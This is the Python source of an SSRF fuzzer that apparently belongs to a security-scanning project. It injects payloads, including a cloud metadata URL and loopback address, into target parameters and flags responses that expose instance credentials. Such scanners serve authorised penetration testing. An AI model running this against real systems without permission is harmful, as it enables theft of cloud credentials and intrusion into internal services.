#!/usr/bin/env python3
import sys
import json
import os
import uuid
import time
from pathlib import Path
import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# FIX: ensure /app is on path for tools import inside Docker
sys.path.insert(0, "/app")
sys.path.insert(0, str(Path(__file__).parent.parent.parent))

try:
    from tools.interactsh_client import InteractshClient
    _HAS_INTERACTSH = True
except Exception:
    _HAS_INTERACTSH = False

# FIX: ROOT must resolve correctly both inside Docker and locally
# Inside Docker: /ssrf_fuzzer/run.py -> ROOT = /app
# Locally: scanners/ssrf_fuzzer/run.py -> ROOT = ssrf_project/
_script_dir = Path(__file__).resolve().parent
_local_root = _script_dir.parent.parent
ROOT = Path("/app") if Path("/app/input").exists() else _local_root

OUT_DIR = Path(os.environ.get("OUT_DIR", "/out"))
OUT_DIR.mkdir(parents=True, exist_ok=True)

DEFAULT_PAYLOADS_TXT = ROOT / "payloads" / "ssrf" / "default_payloads.txt"
DEFAULT_PAYLOADS_CSV = ROOT / "payloads" / "ssrf" / "ssrf_payloads.csv"

SAFE_MODE = os.environ.get("SSRF_SAFE_MODE", "1") == "1"
OOB_BASE = os.environ.get("OOB_BASE_DOMAIN", "oob.localtest.me")
TIMEOUT = 8


def generate_oob(scan_id=None):
    if _HAS_INTERACTSH:
        try:
            client = InteractshClient()
            info = client.register(prefix=(scan_id or str(uuid.uuid4())), ttl=3600)
            return info.get("domain"), info.get("id")
        except Exception as e:
            print("WARN: interactsh register failed:", e)
    token = uuid.uuid4().hex
    return f"{token}.{OOB_BASE}", token


def load_payloads(oob_domain):
    lines = []

    if DEFAULT_PAYLOADS_TXT.exists():
        lines = [
            ln.strip()
            for ln in DEFAULT_PAYLOADS_TXT.read_text().splitlines()
            if ln.strip() and not ln.startswith("#")
        ]
    elif DEFAULT_PAYLOADS_CSV.exists():
        import csv
        with open(DEFAULT_PAYLOADS_CSV, newline="", encoding="utf-8") as f:
            reader = csv.DictReader(f)
            for row in reader:
                p = (row.get("payload") or row.get("request_path") or "").strip()
                if p:
                    lines.append(p)

    if not lines:
        lines = [
            f"http://{oob_domain}",
            "http://169.254.169.254/latest/meta-data/",
            "http://127.0.0.1/",
        ]

    out = []
    for ln in lines:
        if SAFE_MODE and ("file://" in ln or ln.startswith("gopher://")):
            continue
        out.append(ln.replace("{OOB}", oob_domain))
    return out


def build_requests_for_target(target, payload):
    method = (target.get("method") or "GET").upper()
    url = target.get("url")
    params = target.get("params") or {}
    reqs = []

    if params:
        for pname in params.keys():
            data = {}
            for k in params.keys():
                if k == pname:
                    data[k] = payload
                else:
                    v = params[k]
                    data[k] = v.get("example", "") if isinstance(v, dict) else str(v)
            reqs.append({"method": method, "url": url, "params": None, "data": data, "param_name": pname})

    reqs.append({"method": "GET", "url": url, "params": {"url": payload}, "data": None, "param_name": "url"})
    return reqs


def send_request(reqobj):
    try:
        if reqobj.get("data") is not None:
            r = requests.request(
                reqobj["method"], reqobj["url"],
                data=reqobj.get("data"),
                timeout=TIMEOUT, allow_redirects=False, verify=False
            )
        else:
            r = requests.request(
                reqobj["method"], reqobj["url"],
                params=reqobj.get("params"),
                timeout=TIMEOUT, allow_redirects=False, verify=False
            )
        return {
            "status_code": r.status_code,
            "headers": dict(r.headers),
            "body_snippet": r.text[:2000] if r.text else ""
        }
    except Exception as e:
        return {"error": str(e)}


def analyze_target(target, oob_domain):
    findings = []
    payloads = load_payloads(oob_domain)

    for payload in payloads:
        reqs = build_requests_for_target(target, payload)
        for r in reqs:
            info = {
                "payload": payload,
                "param": r.get("param_name"),
                "method": r.get("method"),
                "url": r.get("url")
            }
            res = send_request(r)
            info["response"] = res

            body = str(res.get("body_snippet") or "").lower()
            triggered = False
            notes = []

            if any(x in body for x in ("iam", "accesskey", "security-credentials", "meta-data", "metadata", "instance")):
                triggered = True
                notes.append("body-matches-metadata")

            sc = res.get("status_code")
            if sc and 300 <= int(sc) < 400:
                loc = (res.get("headers") or {}).get("Location", "")
                if "169.254" in loc or "metadata" in loc:
                    triggered = True
                    notes.append(f"redirects-to-internal:{loc}")

            if triggered:
                sev = "high" if ("accesskey" in body or "security-credentials" in body) else "medium"
                findings.append({
                    "tool": "ssrf_fuzzer",
                    "target_id": target.get("id"),
                    "endpoint": r.get("url"),
                    "param": r.get("param_name"),
                    "payload": payload,
                    "evidence": {"raw": res, "notes": notes},
                    "severity": sev,
                    "confidence": "medium"
                })
    return findings


def main():
    raw = sys.stdin.read()
    if not raw:
        print(json.dumps({"error": "no input"}))
        return

    try:
        job = json.loads(raw)
    except json.JSONDecodeError as e:
        print(json.dumps({"error": f"invalid json input: {e}"}))
        return

    target = job.get("target") or {}
    scan_id = job.get("id") or str(uuid.uuid4())
    oob_domain = job.get("oob_domain")

    if not oob_domain:
        oob_domain, _ = generate_oob(scan_id)

    findings = analyze_target(target, oob_domain)
    result = {
        "job_id": scan_id,
        "target": target.get("id"),
        "oob": {"domain": oob_domain},
        "findings": findings
    }

    outpath = OUT_DIR / f"{target.get('id', 'unknown')}_{scan_id}.json"
    outpath.write_text(json.dumps(result, indent=2))
    print(json.dumps(result))


if __name__ == "__main__":
    main()